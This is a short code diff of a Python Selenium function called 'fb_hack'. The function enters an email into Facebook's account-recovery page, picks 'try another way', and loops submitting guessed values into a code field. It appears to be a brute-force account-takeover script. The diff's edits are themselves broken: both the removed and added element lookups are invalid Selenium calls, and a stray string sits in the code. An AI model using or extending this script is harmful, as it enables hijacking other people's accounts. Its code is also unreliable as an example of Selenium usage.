@@ -38,10 +38,10 @@ def fb_hack(email, codex, respect):
   soup = BeautifulSoup(html, 'html.parser')
   #wait = WebDriverWait(driver, 10)
   #element = wait.until(EC.visibility_of_element_located((by = By.ID, "element_id")))
-  search_box = driver.find_element(By.NAME = "email")
+  search_box = driver.find_element(By.NAME == "email")
   search_box.send_keys(email)
   search_box.submit()
-  search_button = driver.find_element(By.NAME = "tryanotherway")
+  search_button = driver.find_element(By.NAME == "tryanotherway")
   search_button.click()
   driver.submit()
   "make respect properly"
@@ -62,7 +62,7 @@ def fb_hack(email, codex, respect):
       print("working", end='\r')
     else:
       try:
-        searchbox = driver.find_element(by=By.NAME, value="n")
+        searchbox = driver.find_element(By.NAME == "n")
         searchbox.send_keys(p)
         searchbox.submit()
       except:
